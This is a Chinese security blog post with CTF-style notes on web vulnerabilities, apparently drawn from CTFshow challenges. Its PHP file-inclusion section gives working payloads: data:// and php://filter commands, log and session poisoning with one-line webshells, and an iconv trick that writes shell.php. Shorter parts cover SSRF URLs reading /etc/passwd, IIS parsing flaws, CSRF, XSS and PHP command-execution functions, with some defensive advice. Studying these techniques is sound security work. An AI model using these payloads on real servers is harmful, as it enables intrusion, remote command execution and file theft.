@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>漏洞利用 | RngAd33的博客</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('/img/bg.jpg');
+ --light-background: url('/img/bk.jpg');
+ --theme-encrypt-confirm: 'confirm'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>漏洞利用</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-10-02T15:02:55.409Z" id="date"> 2024-10-02</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-10-24T06:44:55.853Z" id="updated"> 2024-10-24</time></div></span></div></div><hr><div id="post-content"><p>安全无止境，继续前进吧！</p>
+<p>告诉你一个好消息,博士：<br>罗德岛安全部的漏洞分析工作取得了较大进展，<br>这离不开安全部的大家日日夜夜的付出，<br>也离不开你对这项工作的大力支持。<br>我们决定对一些重要且较复杂的漏洞单独剔出以进行更详细的汇总，<br>继续努力吧，博士，我会在后方默默守护你的。<br>–by Civilight Eterna</p>
+<p class='item-img' data-src='/./img/IMG_20240829_021356_657.gif'><img src="/./img/IMG_20240829_021356_657.gif"></p>
+<h1 id="伪随机数漏洞"><a href="#伪随机数漏洞" class="headerlink" title="伪随机数漏洞"></a>伪随机数漏洞</h1><p>有时候，我们需要一定的认证手段防范恶意攻击，比如说使用随机数。但是，在同一个随机数种子下，随机数的序列是相同的。<br>以Python为例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import random<br>p = random.getrandbits(512) <br></code></pre></td></tr></table></figure>
+<p>执行完毕后，p为512个bit位的随机数<br>如果事先初始化随机数种子：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">import random<br>random.seed(0)<br>p = random.getrandbits(512) <br></code></pre></td></tr></table></figure>
+<p>每次执行完毕后，p为512个bit位的固定数。如果生成的是一个数组，那么每次生成的数组的序列是相同的。</p>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>使用各类文件包含指令，对目标实施攻击；</p>
+<h2 id="包含种类"><a href="#包含种类" class="headerlink" title="包含种类"></a>包含种类</h2><ol>
+<li>data包含<br> 用于执行一句话木马，查找并获取flag。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;ls&quot;</span>)?&gt;<br>?file=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;ls *.php&quot;</span>)?&gt;     // 仅查找.php文件<br>?file=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;tac flag.php&quot;</span>)?&gt;<br>?file=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;tac fl*g.*&quot;</span>)?&gt;   // 绕过flag，php过滤<br>?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=   //绕过system，&lt;?过滤<br></code></pre></td></tr></table></figure></li>
+<li>filter包含<br> 用于获取网页PHP源代码，但在不知道flag在哪时不好用。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/read=convert.base64-encode/resource=index.php<br>?file=php://filter/convert.base64-encode/resource=index.php<br>  // 适用于<span class="hljs-built_in">base64</span>被过滤的情况<br></code></pre></td></tr></table></figure></li>
+<li>http日志包含<br> nginx默认日志路径。配合burpsuite使用，与data包含功能相似，伟大无需多言。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/var/log/nginx/access.log<br>?file=/../../../access.log   // 路径穿越<br></code></pre></td></tr></table></figure>
+包含前，拦截http请求头，在ua信息末尾插入一句话木马（一般用来传参）后放行请求头；<br>传参后，在日志包含口令后面添加系统命令，随后可以找到flag；<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/* 假设已经上传的参数为1 */<br>?file=/var/log/nginx/access.log&amp;1=system(<span class="hljs-string">&#x27;ls *.php&#x27;</span>);<br>?file=/var/log/nginx/access.log&amp;1=system(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure></li>
+<li>SSH日志包含<br> 与http日志包含相似，利用恶意用户名注入一句话木马；<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/var/log/auth.log<br>?file=/var/log/secure<br></code></pre></td></tr></table></figure>
+请注意：日志文件会记录最为原始的URL请求，在浏览器地址栏中输入的地址会被URL编码，<br>通过CURl或者Burp改包绕过编码。</li>
+<li>session包含<br>php将用户session以文件的形式保存在主机中，通过php.ini文件中的session.save_path字段可以设置具体的存储位置，通过phpinfo()也可以查询到；<br>一些可能的session文件存放路径：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/var/lib/php/sess_PHPSESSID<br>?file=/var/lib/php/sessions/sess_PHPSESSID<br>?file=/tmp/sess_PHPSESSID<br>?file=/tmp/sessions/sess_PHPSESSID<br></code></pre></td></tr></table></figure>
+另一种思路：通过条件竞争实现session包含：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br>&lt;form action=<span class="hljs-string">&quot;------------URL-----------&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span> /&gt;<br>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span> /&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;?php<br>session_start();<br>?&gt;<br></code></pre></td></tr></table></figure>
+利用这个脚本，随便上传一个文件（文件不能太大，不然会502报错），实际上是通过上传PHP_SESSION_UPLOAD_PROGRESS<br>并访问&#x2F;tmp&#x2F;sess_xxx，利用burpsuite抓包后不断发送访问请求，实现文件包含；<br>在Cookie里设置参数PHPSESSID&#x3D;exp，php将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_exp；<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/tmp/sess_exp<br>Cookie: PHPSESSID=exp<br></code></pre></td></tr></table></figure>
+但是对于默认配置session.upload_progress.cleanup &#x3D; on，文件上传后session文件内容会立即被清空，<br>对此，我们需要通过条件竞争，在服务器还未来得及删除我们上传的session文件内容时包含到该文件，实现恶意代码的命令执行。<br>举个例子（CTFshow_Web入门_web85）：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;&lt;&quot;</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+CTFshow_Web82~86 WP参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/140207360">https://blog.csdn.net/Myon5/article/details/140207360</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="hljs-variable">$contents</span>);<br><br><br>payload:<br>    GET部分：<br>        ?file=php:<span class="hljs-comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php</span><br>    POST部分：<br>        contents=?&lt;hp pe@<span class="hljs-title function_ invoke__">av</span>(l_<span class="hljs-variable">$EG</span>[T]<span class="hljs-number">1</span>;)&gt;?<br><br>运行后，访问url/shell.php执行系统命令：<br>    /shell.php?<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br>    /shell.php?<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac flag.php&quot;</span>);<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>通过在上传的文件中插入一句话木马，在缺乏防护的情况下，可以实现对服务器的命令控制；</p>
+<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p>配合各种Web容器的解析漏洞，可以更好地利用上传漏洞；</p>
+<h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h3><p>针对IIS6.0，其在解析文件时存在以下两种漏洞：</p>
+<ol>
+<li><p>目录解析漏洞<br> *.asa或*.asp格式的文件夹下的任意文件均能被当作asp文件解析；</p>
+</li>
+<li><p>文件名解析漏洞<br> *.asp;1.jpg文件会被当做asp文件执行；</p>
+</li>
+<li><p>畸形解析漏洞<br> 微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞；<br> 在IIS7.0中，在默认Fast-CGI开启状况下，在上传的文件中写入一句话木马（假设上传传入参数为shell），<br> 随后访问”上传路径&#x2F;文件名.后缀名&#x2F;shell.php”，文件当中的一句话木马将被执行。</p>
+</li>
+</ol>
+<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><h2 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h2><h2 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h2><h1 id="XSS跨站脚本漏洞"><a href="#XSS跨站脚本漏洞" class="headerlink" title="XSS跨站脚本漏洞"></a>XSS跨站脚本漏洞</h1><p>过滤验证很重要，但如果只设置javascript前端验证，忽略了后端验证，就会留下漏洞。</p>
+<p>比如说，我们要在网页上输入一段信息，javascript验证可以在提交数据之前过滤掉敏感字符，这样主要是为了防止用户输入错误。</p>
+<p>然而，绕过javascript验证的思路也非常简单：先提交合法数据，再拦截上传的http(s)请求并将原先输入的合法数据修改为敏感数据，最后上传篡改后的http(s)请求，就能够成功提敏感数据，造成XSS漏洞。</p>
+<p>所以，设置服务器端验证是非常重要的攻击防护手段，每一位web开发人员都应当具有这样的意识。</p>
+<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><p>跨站请求伪造漏洞，黑客通过盗用身份建立会话，进行一系列非法操作，或者欺骗用户访问带有木马的url链接。传说中的钓鱼链接就是这样来的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url + /vul/csrf/csrfget/csrf_get_edit.php? + 内容<br></code></pre></td></tr></table></figure>
+<p>防护策略:</p>
+<ol>
+<li>要求用户进行二次确认；</li>
+<li>阻止不明外域的访问；</li>
+<li>提交时要求附加只有在本域才能获取的信息；</li>
+<li>增加token（令牌）验证（token需要随机生成，值足够大，用后需销毁）；</li>
+<li>增加验证码；</li>
+</ol>
+<h4 id="请注意：当网站同时存在XSS漏洞和CSRF漏洞时，token验证机制将会失效！"><a href="#请注意：当网站同时存在XSS漏洞和CSRF漏洞时，token验证机制将会失效！" class="headerlink" title="请注意：当网站同时存在XSS漏洞和CSRF漏洞时，token验证机制将会失效！"></a>请注意：当网站同时存在XSS漏洞和CSRF漏洞时，token验证机制将会失效！</h4><h1 id="逻辑错误漏洞"><a href="#逻辑错误漏洞" class="headerlink" title="逻辑错误漏洞"></a>逻辑错误漏洞</h1><pre><code>当一个系统的功能太多的时候，难免会出现由开发人员思路错误或思考不全面导致的程序逻辑问题，导致了逻辑漏洞；
+</code></pre>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><pre><code>发现网页功能-&gt;了解业务流程-&gt;拦截、篡改http(s)请求
+</code></pre>
+<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><p>如果服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制，黑客可以通过伪造服务端请求对其他服务器实施攻击，一般用于攻击与外界隔离的内部服务器；</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ol>
+<li>探测内网信息；</li>
+<li>窃取敏感内容；</li>
+<li>作为跳板，攻击其他网站或应用；</li>
+</ol>
+<h2 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h2><h3 id="Dict协议"><a href="#Dict协议" class="headerlink" title="Dict协议"></a>Dict协议</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">dict://ip:port<br>dict://ip:port/command<br><br>eg:<br>dict://fuzz.wuyun.org:8000/helo:dict<br></code></pre></td></tr></table></figure>
+<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://ip:port/_TCP/IP数据流<br><br>eg:<br>gopher://fuzz.wuyun.org:8000/gopher<br></code></pre></td></tr></table></figure>
+<h3 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">file:///etc/passwd<br></code></pre></td></tr></table></figure>
+
+<h1 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h1><p>远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h3><ol>
+<li>shell_exec()：将字符串作为OS命令执行</li>
+<li>system()：将字符串作为OS命令执行，且返回命令执行结果；</li>
+<li>exec()：将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；</li>
+<li>passthru()：将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</li>
+<li>popen()：打开进程文件指针</li>
+<li>proc_open()：与popen()类似</li>
+<li>pcntl_exec()：在当前进程空间执行指定程序；</li>
+<li>反引号&#96;&#96;：其中的字符串会被解析为OS命令；</li>
+</ol>
+<h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><ol>
+<li>eval()：将字符串作为php代码执行；</li>
+<li>assert()：将字符串作为php代码执行；</li>
+<li>preg_replace()：正则匹配替换字符串；</li>
+<li>create_function()：主要创建匿名函数；</li>
+<li>call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</li>
+<li>call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</li>
+</ol>
+<h2 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h2><ol>
+<li>管道符</li>
+<li>空格过滤</li>
+<li>取反绕过</li>
+<li>异或绕过</li>
+<li>自增绕过</li>
+<li>黑名单绕过</li>
+<li>base和hex编码绕过</li>
+<li>正则匹配绕过</li>
+<li>回溯绕过</li>
+</ol>
+<h2 id="RCE命令执行"><a href="#RCE命令执行" class="headerlink" title="RCE命令执行"></a>RCE命令执行</h2><ol>
+<li>无回显RCE</li>
+<li>无参数RCE</li>
+<li>无字母数字RCE</li>
+</ol>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol>
+<li>继承Web服务器程序权限，去执行系统命令；</li>
+<li>继承Web服务器权限，读写文件；</li>
+<li>反弹shell；</li>
+<li>控制整个网站甚至是服务器；</li>
+</ol>
+<h2 id="防护策略-1"><a href="#防护策略-1" class="headerlink" title="防护策略"></a>防护策略</h2><ol>
+<li>对用户的输入作严格的过滤，如白名单策略；</li>
+<li>尽量避免使用容易产生漏洞的危险函数；</li>
+<li>保证用户不调用控制危险函数的传参；</li>
+</ol>
+<h1 id=""><a href="#" class="headerlink" title="&lt;- To be continued  (:3 ∠)_"></a>&lt;- To be continued  <em>(:3 ∠)</em>_</h1><div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/09/21/Reverse%E4%B8%80%E7%82%B9%E5%BF%83%E5%BE%97/">Reverse一点心得 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RngAd33</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" href="mailto:yxbsyx@outlook.com"><i class="fa fa-envelope" alt="E-Mail"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/403699403/favlist?fid=2455564303&amp;ftype=create"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">伪随机数漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E7%A7%8D%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">包含种类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.1.</span> <span class="toc-text">IIS解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.2.</span> <span class="toc-text">Apache解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">绕过上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5"><span class="toc-number">3.3.</span> <span class="toc-text">防护策略</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 